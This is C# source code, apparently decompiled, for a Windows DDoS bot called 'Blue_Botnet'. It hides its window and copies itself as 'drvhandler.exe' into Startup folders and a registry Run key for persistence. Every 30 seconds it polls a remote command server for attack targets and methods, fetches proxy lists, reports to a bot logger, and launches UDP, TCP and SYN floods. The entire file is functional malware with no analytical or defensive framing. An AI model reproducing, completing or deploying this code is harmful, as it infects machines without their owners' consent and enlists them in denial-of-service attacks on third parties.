using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Blue_Botnet
{
	public class Form1 : Form
	{
		public string webRoot;

		public int threads;

		public DoSAttack attacco = new DoSAttack();

		public string ip;

		public int port;

		public string method;

		private IContainer components = null;

		public Form1()
		{
			InitializeComponent();
		}

		public void loadStuff()
		{
			try
			{
				StreamReader streamReader = new StreamReader(Application.ExecutablePath);
				string text = streamReader.ReadToEnd();
				text = text.Substring(text.IndexOf("-START-"), text.IndexOf("-END-") - text.IndexOf("-START-"));
				string text2 = text.Replace("-START-", "");
				webRoot = text2.Split('*')[0];
				threads = toInt(text2.Split('*')[1]);
			}
			catch
			{
			}
		}

		public void setOnStartup()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			bool flag = false;
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\drvhandler.exe");
				flag = true;
			}
			catch
			{
			}
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\ProgramData\\Microsoft\\Windows\\Menu Start\\Programmi\\Esecuzione Automatica\\drvhandler.exe");
				flag = true;
			}
			catch
			{
			}
			if (!flag)
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "drvhandler.exe"));
					bool flag2 = false;
					try
					{
						registryKey.SetValue("sysDrvHandler", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "drvhandler.exe"));
					}
					catch
					{
						try
						{
							registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\LocalMachine\\Run", writable: true);
							registryKey.SetValue("sysDrvHandler", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "drvhandler.exe"));
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}

		public void updateLists()
		{
			try
			{
				attacco.proxyList = fileFromWebRoot("proxy").Split('\n');
			}
			catch
			{
			}
			try
			{
				attacco.blogList = fileFromWebRoot("blog").Split('\n');
			}
			catch
			{
			}
		}

		public void updateTarget()
		{
			string text = fileFromWebRoot("target");
			if (text.Contains("|"))
			{
				string[] array = text.Split('|');
				ip = array[0];
				port = toInt(array[1]);
				method = array[2];
			}
			else
			{
				method = fileFromWebRoot("target.method");
				ip = fileFromWebRoot("target.ip");
				port = toInt(fileFromWebRoot("target.port"));
			}
			if (ip != "STOP")
			{
				if (attacco.isUrl(ip) && (method == "UDP" || method == "TCP" || method == "SYN" || method == "MCBOTALPHA"))
				{
					ip = attacco.resolveUrl(ip);
				}
				attacco.ip = ip;
				attacco.port = port;
				attacco.method = method;
			}
			else
			{
				attacco.method = "STOP";
			}
			fileFromWebRoot("botlogger.php");
		}

		public int toInt(string stringa)
		{
			try
			{
				return Convert.ToInt32(stringa);
			}
			catch
			{
				return 0;
			}
		}

		public string onlineFileContent(string link)
		{
			try
			{
				WebClient webClient = new WebClient();
				Stream stream = webClient.OpenRead(link);
				StreamReader streamReader = new StreamReader(stream);
				string text = streamReader.ReadToEnd();
				if (text == null)
				{
					return "";
				}
				return text;
			}
			catch
			{
				return "";
			}
		}

		public string fileFromWebRoot(string file)
		{
			return onlineFileContent(webRoot + file);
		}

		private void targetUpdater()
		{
			while (true)
			{
				Thread.Sleep(30000);
				updateTarget();
			}
		}

		private void listsUpdater()
		{
			while (true)
			{
				Thread.Sleep(300000);
				updateLists();
			}
		}

		private void main()
		{
			loadStuff();
			setOnStartup();
			updateLists();
			updateTarget();
			attacco.attack(ip, port, method, threads);
			Thread thread = new Thread(targetUpdater);
			Thread thread2 = new Thread(listsUpdater);
			thread.Start();
			thread2.Start();
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			Thread thread = new Thread(main);
			thread.Start();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			SuspendLayout();
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(0, 0);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			MaximumSize = new System.Drawing.Size(1, 1);
			base.MinimizeBox = false;
			base.Name = "Form1";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			Text = "Form1";
			base.Load += new System.EventHandler(Form1_Load);
			ResumeLayout(false);
		}
	}
}
